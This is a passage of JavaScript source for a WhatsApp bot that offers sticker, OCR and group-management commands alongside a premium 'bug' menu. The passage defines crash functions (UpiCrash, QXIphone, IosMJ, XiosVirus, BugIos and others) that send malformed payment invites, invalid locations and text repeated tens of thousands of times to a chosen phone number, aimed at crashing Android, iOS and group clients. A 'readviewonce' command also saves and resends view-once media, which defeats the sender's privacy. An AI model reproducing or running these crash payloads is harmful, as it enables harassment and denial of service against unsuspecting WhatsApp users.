│ \`ᜡ\` _*Zacx*_ < OwnImprove >
║ \`ᜡ\` _*BenkzGyuichi*_ < SPY >
│ \`ᜡ\` _*ZenXiter*_ < Supported > 
╚▭▭▭▭▭▭▭▭▭▭▭▭▷
> © 𝐑𝐚𝐩𝐢𝐩𝐍𝐨𝐂𝐨𝐮𝐧𝐭𝐞𝐫 ©Copyright
` 
async function fetchBuffer (url, options) {
  try {
    options ? options : {};
    const res = await axios({
      method: "GET",
      url,
      headers: {
        "User-Agent":
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36",
        DNT: 1,
        "Upgrade-Insecure-Request": 1,
      },
      ...options,
      responseType: "arraybuffer",
    });
    return res.data;
  } catch (err) {
    return err;
  }
};


 (async () => {

const buttons = [
  {
    buttonId: ".funmenu", 
    buttonText: {
      displayText: "𝐀𝐋̲̅𝐋́ 𝐌̶̅𝐄̋𝐍̶̅͟𝐔⚡"
    }
  },
  {
    buttonId: ".xs", 
    buttonText: { 
      displayText: '𝐗𝐯̷̚𝐥𝐨𝐢̶̅𝐝𝐁̲𝐮𝐠̋𝐱🚀' 
    }
  }, 
  {
    buttonId: ".owner", 
    buttonText: {
      displayText: "𝐑͟͞𝐚͓̋𝐩͞𝐢̶𝐩̅𝐩͊͢𝐩͊𝐌̷𝐨̲𝐝̚𝐬̋𝐬"
    }
  }
];

let buttonMessage = {
  document: { url: "https://www.youtube.com/@stokrapip" },
  mimetype: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
  fileName: "𝐈𝐧ͧ͟𝐕𝐥𝐨𝐢̶̅𝐝͟𝐙𝐞̶̋𝐫𝐨🐉️",
  fileLength: 999,
  pageCount: 999,
  contextInfo: {
  mentionedJid: [m.sender],
  forwardedNewsletterMessageInfo: {
  newsletterName: "RapipNoCounterr!!",
  newsletterJid: `120363369514105242@newsletter`
    },
    forwardingScore: 999,
    isForwarded: true,
    externalAdReply: {
      mediaUrl: "https://www.youtube.com/@stokrapip",
      mediaType: 2,
      previewType: "pdf",
      title: "RapipppNoCounterr",
      body: "RapippGanzz", 
      thumbnail: await fetchBuffer("https://a.top4top.io/p_3301x9aew0.jpg"),
      sourceUrl: "https://www.youtube.com/@stokrapip",
    },
  },
  caption: Menu,
  footer: "© 𝐑𝐚𝐩𝐢𝐩𝐍𝐨𝐂𝐨𝐮𝐧𝐭𝐞𝐫 ©Copyright",
  buttons: buttons,
  viewOnce: true,
  headerType: 6,
};

return await Rapip.sendMessage(m.chat, buttonMessage, { quoted: Zets });
})()
}
break

case 'owner': {
let name = m.pushName || Rapip.getName(m.sender);
let pan = `
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
> 𝐈𝐧ͧ͟𝐕𝐥𝐨𝐢̶̅𝐝͟𝐙𝐞̶̋𝐫𝐨🐉
▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰
`;
const url = fs.readFileSync("./apip.jpeg")
async function image(url) {
  const { imageMessage } = await generateWAMessageContent({
    image: {
      url
    }
  }, {
    upload: Rapip.waUploadToServer
  });
  return imageMessage;
}
let msg = generateWAMessageFromContent(
  m.chat,
  {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: pan
          },
          carouselMessage: {
            cards: [
              {
                header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './apip.jpeg' } }, { upload: Rapip.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: 'RapippGnzz',
          hasMediaAttachment: false
        }),
                body: {
                  text: `
┏───────────────┈ 
┆ 「 *\`[DEV BOT]\`* 」
┣───────────────┈ 
┣=[ *\`[ RapippModss ]\`* ]==─
┆ • Jangan Chat Yang Aneh Aneh
┆ • Jangan Telpon/Call Owner 
┆ • Chat Langsung ke intinya aja
┆ • Klo Ada Uang Minimal Bagi
└────────────┈ ⳹`
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "cta_url",
                      buttonParamsJson: `{"display_text":"Developer Invloidx ( rapip )","url":"https://t.me/xyroooy","merchant_url":"https://t.me/xyroooy"}`
                    },
                  ],
                },
              },
              {
                header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './apip.jpeg' } }, { upload: Rapip.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: 'Saluran',
          hasMediaAttachment: false
        }),
                body: {
                  text: `
┏───────────────┈ 
┆「 *\`[CHANNEL OFC]\`* 」
┣───────────────┈ 
└────────────┈ ⳹`
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "cta_url",
                      buttonParamsJson: `{"display_text":"Saluran Invloidx🐉","url":"https://whatsapp.com/channel/0029Vb3FLbNDeON7RBx7OX0l","merchant_url":"https://whatsapp.com/channel/0029Vb3FLbNDeON7RBx7OX0l"}`
                    },
                  ],
                },
              },
            ],
            messageVersion: 1,
          },
        },
      },
    },
  },
  {}
);

await Rapip.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id,
});

}
break;

case 'xs': {
if (!PremOnly) return reply33(`premium only`);
if (!DevOnly) return reply33(`owner only`)
if (!q) return reply33(`*Syntax Error!*\n\n_Use : Xs Number_\n_Example : Xs 62xx_\n\𝐈𝐧ͧ͟𝐕𝐥𝐨𝐢̶̅𝐝͟𝐙𝐞̶̋𝐫𝐨🐉`);
incTarget = qtext.split("|")[0].replace(/[^0-9]/g, '')
if (incTarget.startsWith('0')) return reply33(`*Error!*\n\n_Use : Xs Number_\n_Example : Xs 62xx_\n\𝐈𝐧ͧ͟𝐕𝐥𝐨𝐢̶̅𝐝͟𝐙𝐞̶̋𝐫𝐨🐉`)
let target = incTarget + '@s.whatsapp.net'
global.jumlah = qtext.split("|")[1]
let teks = `
𝗦𝗘𝗟𝗘𝗖𝗧 𝗧𝗛𝗘 𝗗𝗘𝗦𝗜𝗥𝗘𝗗 𝗕𝗨𝗚🍏
> 𝐈𝐧ͧ͟𝐕𝐥𝐨𝐢̶̅𝐝͟𝐙𝐞̶̋𝐫𝐨🐉`
  const bet = {
    title: "𝐑͟͞𝐚͓̋𝐩͞𝐢̶𝐩̅𝐩͊͢𝐩͊𝐌̷𝐨̲𝐝̚𝐬̋𝐬",
    sections: [
      {
        title: `𝑩̶𝒆𝒕̶̈́͢𝒂 𝑭𝒐̸̶͠𝒓 𝑨𝒏̋͢𝒅𝒓̶̋𝒐𝒊̎𝒅🪷`, 
        highlight_label: `RapipppNoCounterr🐉`,
        rows: [
          {
            title: "𝐗𝐈𝐧𝐯𝐚𝐥𝐢𝐝𝐕𝐢𝐩",
            description: "invalid bug crash",
            id: `bug1 ${incTarget}`, 
          },
          {
            title: "𝐗𝐩𝐥𝐨𝐢𝐭𝐏𝐚𝐲",
            description: "payload ( no click )",
            id: `bug2 ${incTarget}`, 
          },
          {
            title: "𝐗𝐁𝐞𝐭𝐚𝐎𝐮𝐭",
            description: "out beta ori",
            id: `bug1 ${incTarget}`, 
          },
          {
            title: "𝐗𝐛𝐮𝐠𝐍𝐞𝐰",
            description: "new bug",
            id: `bug2 ${incTarget}`, 
          },
        ]},
      {
        title: `𝑨𝒑̲̋𝒑̄𝒍͢𝒆 𝑩̲𝒖ٓ𝒈𝑰𝒐͞𝒔🍏`, 
        highlight_label: ``,
        rows: [
          {
            title: "𝐈𝐨𝐬𝐀𝐫𝐜𝐚𝐝𝐞",
            description: "apple crash infinity", 
            id: `bugios1 ${incTarget}`,
          },
          {
            title: "𝐗𝐢𝐧𝐝𝐞𝐱𝐈𝐨𝐬",
            description: "ios bug system",
            id: `bugios4 ${incTarget}`, 
          },
          {
            title: "𝐈𝐨𝐬𝐁𝐮𝐠𝐈𝐧𝐝𝐞𝐱",
            description: "ios down!!",
            id: `bugios5 ${incTarget}`, 
          },
        ]},
      {
        title: `𝑿𝒈𝒓𝒐𝒖𝒑𝑫𝒐𝒘𝒏🦠`, 
        highlight_label: ``,
        rows: [
          {
            title: "𝐗𝐔𝐤𝐧𝐨𝐰𝐧𝐁𝐮𝐠𝐱",
            description: "group crash", 
            id: `bug1 ${incTarget}`,
          },
          {
            title: "𝐗-𝐮𝐥𝐭𝐢𝐦𝐚𝐭𝐞",
            description: "group crash ultimate",
            id: `bug2 ${incTarget}`, 
          },
        ]},
    ]}
    listbut2(m.chat, teks, bet, m)

}

break

// END ALL MENU CASE }
//ACCESS CASE

case 'addowner': case 'addown':
if (!DevOnly) return 
  if (!args[0]) return reply33(`Penggunaan ${prefix + command} Example ${prefix + command} 62xxx`);
  numero = qtext.split("|")[0].replace(/[^0-9]/g, '');
  let loadnum = await Rapip.onWhatsApp(numero + `@s.whatsapp.net`);
  if (loadnum.length == 0) return reply33(`Number Invalid!!!`);
  owner.push(numero);
  Premium.push(numero);
  fs.writeFileSync('./Access/Own.json', JSON.stringify(owner));
  fs.writeFileSync('./Access/Prem.json', JSON.stringify(Premium));
  reply33(`Number ${numero} succes add to database!`);
  break;

//END
//ACCESS CASE

case 'delowner': case 'delown':
if (!DevOnly) return 
  if (!args[0]) return reply33(`Penggunaan ${prefix + command} Example:\n ${prefix + command} 62xxx`);
  numero2 = qtext.split("|")[0].replace(/[^0-9]/g, '');
  numeroX = Owner.indexOf(numero2);
  numload = Premium.indexOf(numero2);
  Owner.splice(numeroX, 1);
  Premium.splice(numload, 1);
  fs.writeFileSync('./Access/Own.json', JSON.stringify(Owner));
  fs.writeFileSync('./Access/Prem.json', JSON.stringify(Premium));
  reply33(`Number ${numero2} succes delate to database!`);
  break;

//END
//ACCESS CASE

case 'addpremium': case 'addprem':
if (!DevOnly) return 
  if (!args[0]) return reply33(`Penggunaan ${prefix + command} Example ${prefix + command} 62xxx`);
  numero = qtext.split("|")[0].replace(/[^0-9]/g, '');
  let Invalid = await Rapip.onWhatsApp(numero + `@s.whatsapp.net`);
  if (Invalid.length == 0) return reply33(`Number Invalid!!!`);
  Premium.push(numero);
  fs.writeFileSync('./Access/Prem.json', JSON.stringify(Premium));
  reply33(`Number ${numero} succes add to database!`);
  break
  
//END
//ACCESS CASE

case 'delpremium': case 'delprem':
if (!DevOnly) return 
  if (!args[0]) return reply33(`Penggunaan ${prefix + command} Example ${prefix + command} 62xxx`);
  numero2 = qtext.split("|")[0].replace(/[^0-9]/g, '');
  numeroX = Premium.indexOf(numero2);
  Premium.splice(numeroX, 1);
  fs.writeFileSync('./Access/Prem.json', JSON.stringify(Premium));
  reply33(`Number ${numero2} succes delate to database!`);
  break;

//END
//QC CASE

case 'qc': {
  if (!q) return reply33(`Send command with text. ${prefix + command} Rapip`);
  let obj = {
    type: 'quote',
    format: 'png',
    backgroundColor: '#ffffff',
    width: 512,
    height: 768,
    scale: 2,
    messages: [
      {
        entities: [],
        avatar: true,
        from: {
          id: 1,
          name: `${pushname}`,
          photo: { 
            url: await Rapip.profilePictureUrl(m.sender, "image").catch(() => 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'),
          }
        },
        text: `${q}`,
        replyMessage: {},
      },
    ],
  };
  let response = await axios.post('https://bot.lyo.su/quote/generate', obj, {
    headers: {
      'Content-Type': 'application/json',
    },
  });
  let buffer = Buffer.from(response.data.result.image, 'base64');
  Rapip.sendImageAsSticker(m.chat, buffer, m, { packname: `${global.packname}`, author: `${global.author}` });
}
break;

//END
//PLAY CASE

case "play": {
        if (!qtext) return reply33(`send title song\n example ${prefix + command} ransom`);
        let search = await yts(qtext);
        let telaso = search.all[0].url;
        let puqi = await VocalRemover(telaso);
          let vocalAudio = puqi.stuffs.find(item => item.bizType === 'origin').key;
          Rapip.sendMessage(m.chat, {
              audio: { url : vocalAudio },
              mimetype: 'audio/mpeg', 
              ptt: true
          },{ quoted:m })
        }
      break
      
//END
//RVO CASE

case "rvo":
case "readvo":
case 'readviewonce':
case 'readviewoncemessage': {

  if (!m.quoted) return reply33("Reply to an image/video that you want to view");
  if (m.quoted.mtype !== "viewOnceMessageV2" && m.quoted.mtype !== "viewOnceMessage") 
    return reply33("This is not a view-once message.");

  let msg = m.quoted.message;
  let type = Object.keys(msg)[0];

  if (!["imageMessage", "videoMessage"].includes(type)) {
    return reply33("The quoted message is not an image or video.");
  }

  // Download media content
  let media = await downloadContentFromMessage(msg[type], type === "imageMessage" ? "image" : "video");

  let bufferArray = [];
  for await (const chunk of media) {
    bufferArray.push(chunk);
  }
  let buffer = Buffer.concat(bufferArray);

  // Send media according to type (image or video)
  if (type === "videoMessage") {
    await Rapip.sendMessage(m.chat, { video: buffer, caption: msg[type].caption || "" });
  } else if (type === "imageMessage") {
    await Rapip.sendMessage(m.chat, { image: buffer, caption: msg[type].caption || "" });
  }
  await Rapip.sendMessage(m.chat, { react: { text: '✅', key: m.key } }); 
}
break

//END
//SETPP CASE

case "setpp": {
  if (!DevOnly) return 
  if (!m.quoted) return reply33("Reply to an image with this command to set profile picture!");
  
  try {
    const media = await Rapip.downloadAndSaveMediaMessage(m.quoted);
    const { img } = await generateProfilePicture(media);

    await Rapip.query({
      tag: "iq",
      attrs: {
        to: BotNum,
        type: "set",
        xmlns: "w:profile:picture"
      },
      content: [{
        tag: "picture",
        attrs: {
          type: "image"
        },
        content: img
      }]
    });

    await reply33("Profile picture set successfully!");
  } catch (error) {
    console.error(error);
    await reply33("Failed to set profile picture. Make sure you replied to an image and try again.");
  }
}
break
//END
//DELETE PP CASE

case "delpp": {
if (!DevOnly) return 
  Rapip.removeProfilePicture(Rapip.user.id);
  reply33("Success Delete Profile Picture");
}
break;

//END
//TOVN CASE

case 'tovn': {
  if (!/video/.test(mime) && !/audio/.test(mime)) return reply33(`Reply media with caption ${prefix + command}`);
  if (!quoted) return reply33(`Reply video/vn with caption ${prefix + command}`);
  
  let media = await quoted.download();
  let { toAudio } = require('../System/Data4');
  let audio = await toAudio(media, 'mp4');
  
  Rapip.sendMessage(m.chat, { audio, mimetype: 'audio/mpeg', ptt: true }, { quoted: m });
}
break;

//END
//HIDETAG CASE

case 'hidetag': {
  if (!DevOnly) return 
  if (!m.isGroup) return 
  Rapip.sendMessage(from, { text: q ? q : 'Finix Always Stay In Here', mentions: participants.map(a => a.id) }, { quoted: m });
}
break;

//END
//KICK CASE

case 'kick': {
if (!DevOnly) return 
  if (!m.isGroup) return 
  if (!BotAdm) return  
  if (!Adm) return 

  let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
  if (!q) return reply33("Send number / tag users ");
  await Rapip.groupParticipantsUpdate(from, [users], 'remove');
}
break;

//END
//GET LINK GROUP

case 'linkgroup': case 'linkgc': {
  if (!DevOnly) return 
  if (!m.isGroup) return 
  if (!BotAdm) return  

  let responsegg = await Rapip.groupInviteCode(from);
  Rapip.sendText(from, `https://chat.whatsapp.com/${responsegg}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true });
}
break;

//END
//RESET LINK GC CASE

case 'resetlinkgc': {
  if (!DevOnly) return 
  if (!m.isGroup) return 
  if (!BotAdm) return  
  
  Rapip.groupRevokeInvite(from);
}
break;

//END
//CONTROL CASE

case 'public': {
  if (!DevOnly) return 
  Rapip.public = true;
  reply33(`*Success Change Mode Self To Public*`);
}
break;

//END
//CONTROL CASE

case 'self': case 'private': {
  if (!DevOnly) return
  Rapip.public = false;
  reply33(`*Success Change Mode Public To Self*`);
}
break;

//END
//OCR CASE
case 'ocr': {

  let q = m.quoted ? m.quoted : m;
  let mime = (q.msg || q).mimetype || "";
  if (!mime) return reply33("Send / Reply Image");
  if (!/image\/(jpe?g|png)/.test(mime))
    return reply33(`Tipe ${mime} tidak didukung!`);
  let image = await q.download();
  let download = await Rapip.getFile(image, true);
  let ocr = await ocrSpace(download.filename);
  await Rapip.sendMessage(
    m.chat,
    { text: ocr.ParsedResults[0].ParsedText.trim() },
    { quoted: m },
  );
}
break
//END
//TOURL CASE

case 'tourl': {    
    let q = m.quoted ? m.quoted : m;
    if (!q || !q.download) return reply33(`Reply to an Image or Video with command ${prefix + command}`);
    
    let mime = q.mimetype || '';
    if (!/image\/(png|jpe?g|gif)|video\/mp4/.test(mime)) {
        return reply33('Only images or MP4 videos are supported!');
    }

    let media;
    try {
        media = await q.download();
    } catch (error) {
        return reply33('Failed to download media!');
    }

    const uploadImage = require('../System/Data6');
    const uploadFile = require('../System/Data7');
    let isTele = /image\/(png|jpe?g|gif)|video\/mp4/.test(mime);
    let link;
    try {
        link = await (isTele ? uploadImage : uploadFile)(media);
    } catch (error) {
        return reply33('Failed to upload media!');
    }

    Rapip.sendMessage(m.chat, {
        text: `(no expiration date/unknown)\n ${link}`
    }, { quoted: m });
}
break

//END
//STICKER CASE

case 'sticker': case 's': {
  if (!quoted) return reply33(`Reply Image or Video with command ${prefix + command}`);
  
  if (/image/.test(mime)) {
    let media = await quoted.download();
    let encmedia = await Rapip.sendImageAsSticker(from, media, m, { packname: global.packname, author: global.author });
    await fs.unlinkSync(encmedia);
  } else if (/video/.test(mime)) {
    if ((quoted.msg || quoted).seconds > 11) return reply33('max 10s');
    
    let media = await quoted.download();
    let encmedia = await Rapip.sendVideoAsSticker(from, media, m, { packname: global.packname, author: global.author });
    await fs.unlinkSync(encmedia);
  } else {
    return reply33(`Send Image or Video with command ${prefix + command}\nvideo duration only 1-9s`);
  }
}
break;
//END
//BRAT CASE

case 'brat': {
            if (!q) return reply33(`Send command with text. ${prefix + command} Rapipp`)
            const imageUrl = `https://brat.caliphdev.com/api/brat?text=${q}`
            await makeStickerFromUrl(imageUrl, Rapip, m);
        }
       break

//END
//TES BOT CASE
case 'tes':
case 'status': {
reply33(`*Invloid On*`)
}
break

//END
//TIKTOK CASE

//bug ios
async function UpiCrash(isTarget) {
      await Rapip.relayMessage(
        isTarget,
        {
          paymentInviteMessage: {
            serviceType: "UPI",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: isTarget,
          },
        }
      );
    }

    async function VenCrash(isTarget) {
      await Rapip.relayMessage(
        isTarget,
        {
          paymentInviteMessage: {
            serviceType: "VENMO",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: isTarget,
          },
        }
      );
    }

    async function AppXCrash(isTarget) {
      await Rapip.relayMessage(
        isTarget,
        {
          paymentInviteMessage: {
            serviceType: "CASHAPP",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: isTarget,
          },
        }
      );
    }

    async function SmCrash(isTarget) {
      await Rapip.relayMessage(
        isTarget,
        {
          paymentInviteMessage: {
            serviceType: "SAMSUNGPAY",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: isTarget,
          },
        }
      );
    }

async function newsLetter(isTarget) {
            try {
                const messsage = {
                    botInvokeMessage: {
                        message: {
                            newsletterAdminInviteMessage: {
                                newsletterJid: `33333333333333333@newsletter`,
                                newsletterName: "𝐒𝐙𝐒𝐍𝐀𝐊𝐄 𝐏𝐑𝐎" + "ી".repeat(120000),
                                jpegThumbnail: "",
                                caption: "ꦽ".repeat(120000),
                                inviteExpiration: Date.now() + 1814400000,
                            },
                        },
                    },
                };
                await Rapip.relayMessage(isTarget, messsage, {
                    userJid: isTarget,
                });
            }
            catch (err) {
                console.log(err);
            }
        }

    async function SqCrash(isTarget) {
      await Rapip.relayMessage(
        isTarget,
        {
          paymentInviteMessage: {
            serviceType: "SQUARE",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: isTarget,
          },
        }
      );
    }

    async function FBiphone(isTarget) {
      await Rapip.relayMessage(
        isTarget,
        {
          paymentInviteMessage: {
            serviceType: "FBPAY",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: isTarget,
          },
        }
      );
    }

    async function QXIphone(isTarget) {
      let CrashQAiphone = "𑇂𑆵𑆴𑆿".repeat(60000);
      await Rapip.relayMessage(
        isTarget,
        {
          locationMessage: {
            degreesLatitude: 999.03499999999999,
            degreesLongitude: -999.03499999999999,
            name: CrashQAiphone,
            url: "https://t.me/xyroooy",
          },
        },
        {
          participant: {
            jid: isTarget,
          },
        }
      );
    }

    async function QPayIos(isTarget) {
      await Rapip.relayMessage(
        isTarget,
        {
          paymentInviteMessage: {
            serviceType: "PAYPAL",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: isTarget,
          },
        }
      );
    }

    async function QPayStriep(isTarget) {
      await Rapip.relayMessage(
        isTarget,
        {
          paymentInviteMessage: {
            serviceType: "STRIPE",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: isTarget,
          },
        }
      );
    }

    async function QDIphone(isTarget) {
      Rapip.relayMessage(
        isTarget,
        {
          extendedTextMessage: {
            text: "ꦾ".repeat(55000),
            contextInfo: {
              stanzaId: isTarget,
              participant: isTarget,
              quotedMessage: {
                conversation: "Maaf Kak" + "ꦾ࣯࣯".repeat(50000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
        },
        {
          paymentInviteMessage: {
            serviceType: "UPI",
            expiryTimestamp: Date.now() + 5184000000,
          },
        },
        {
          participant: {
            jid: isTarget,
          },
        },
        {
          messageId: null,
        }
      );
    }

    //

    async function IosMJ(isTarget, Ptcp = false) {
      await Rapip.relayMessage(
        isTarget,
        {
          extendedTextMessage: {
            text: "Wanna With Yours :)" + "ꦾ".repeat(90000),
            contextInfo: {
              stanzaId: "1234567890ABCDEF",
              participant: "0@s.whatsapp.net",
              quotedMessage: {
                callLogMesssage: {
                  isVideo: true,
                  callOutcome: "1",
                  durationSecs: "0",
                  callType: "REGULAR",
                  participants: [
                    {
                      jid: "0@s.whatsapp.net",
                      callOutcome: "1",
                    },
                  ],
                },
              },
              remoteJid: isTarget,
              conversionSource: "source_example",
              conversionData: "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
              conversionDelaySeconds: 10,
              forwardingScore: 99999999,
              isForwarded: true,
              quotedAd: {
                advertiserName: "Example Advertiser",
                mediaType: "IMAGE",
                jpegThumbnail:
                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                caption: "This is an ad caption",
              },
              placeholderKey: {
                remoteJid: "0@s.whatsapp.net",
                fromMe: false,
                id: "ABCDEF1234567890",
              },
              expiration: 86400,
              ephemeralSettingTimestamp: "1728090592378",
              ephemeralSharedSecret:
                "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
              externalAdReply: {
                title: "Ueheheheeh",
                body: "Kmu Ga Masalah Kan?" + "𑜦࣯".repeat(200),
                mediaType: "VIDEO",
                renderLargerThumbnail: true,
                previewTtpe: "VIDEO",
                thumbnail:
                  "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                sourceType: " x ",
                sourceId: " x ",
                sourceUrl: "https://t.me/xyroooy",
                mediaUrl: "https://t.me/xyroooy",
                containsAutoReply: true,
                renderLargerThumbnail: true,
                showAdAttribution: true,
                ctwaClid: "ctwa_clid_example",
                ref: "ref_example",
              },
              entryPointConversionSource: "entry_point_source_example",
              entryPointConversionApp: "entry_point_app_example",
              entryPointConversionDelaySeconds: 5,
              disappearingMode: {},
              actionLink: {
                url: "https://t.me/xyroooy",
              },
              groupSubject: "Example Group Subject",
              parentGroupJid: "6287888888888-1234567890@g.us",
              trustBannerType: "trust_banner_example",
              trustBannerAction: 1,
              isSampled: false,
              utm: {
                utmSource: "utm_source_example",
                utmCampaign: "utm_campaign_example",
              },
              forwardedNewsletterMessageInfo: {
                newsletterJid: "6287888888888-1234567890@g.us",
                serverMessageId: 1,
                newsletterName: " isTarget ",
                contentType: "UPDATE",
                accessibilityText: " isTarget ",
              },
              businessMessageForwardInfo: {
                businessOwnerJid: "0@s.whatsapp.net",
              },
              smbcayCampaignId: "smb_cay_campaign_id_example",
              smbServerCampaignId: "smb_server_campaign_id_example",
              dataSharingContext: {
                showMmDisclosure: true,
              },
            },
          },
        },
        Ptcp
          ? {
              participant: {
                jid: isTarget,
              },
            }
          : {}
      );
    }

    //

    async function XiosVirus(isTarget) {
      Rapip.relayMessage(
        isTarget,
        {
          extendedTextMessage: {
            text: `Wanna With Yours :D -` + "࣯ꦾ".repeat(90000),
            contextInfo: {
              fromMe: false,
              stanzaId: isTarget,
              participant: isTarget,
              quotedMessage: {
                conversation: "Gpp Yah:D ‌" + "ꦾ".repeat(90000),
              },
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING",
              },
            },
            inviteLinkGroupTypeV2: "DEFAULT",
          },
        },
        {
          participant: {
            jid: isTarget,
          },
        },
        {
          messageId: null,
        }
      );
    }
    async function BugIos(isTarget) {
      for (let i = 0; i < 15; i++) {
        await IosMJ(isTarget, true);
